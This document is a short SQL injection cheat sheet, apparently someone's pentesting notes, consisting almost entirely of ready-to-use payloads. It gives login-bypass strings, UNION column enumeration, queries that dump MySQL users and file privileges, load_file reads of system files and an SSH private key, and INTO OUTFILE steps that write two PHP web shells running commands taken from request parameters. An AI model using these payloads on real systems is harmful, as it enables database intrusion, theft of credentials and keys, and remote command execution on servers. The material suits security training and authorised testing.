```
'+OR+1=1--
```

![](Pasted%20image%2020231003144222.png)

```
'--+
```

![](Pasted%20image%2020231003144626.png)

![](Pasted%20image%2020231003144723.png)

## SQL injection UNION attacks

## Determining the number of columns required

```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
etc.
```

```
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
etc.
```

```
union select 1,2,3,4,5,6,7,8,9,10,11,12 --
```

```
group_concat(file_priv,0x3a,user) from mysql.user
```

```
group_concat(version())
```

```
load_file('C:\\Windows\\win.ini')
```

```
into outfile 'C:\\xampp\\htdocs\\filename.ext'
```

```
'<?php phpinfo(); ?>' into outfile 'C:\\xampp\\htdocs\\try.php'
```

```
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>
```

```
<?php system($_GET["cmd"]);?>
```

```
load_file('C:\\Users\\username\\.ssh\\id_rsa')
```

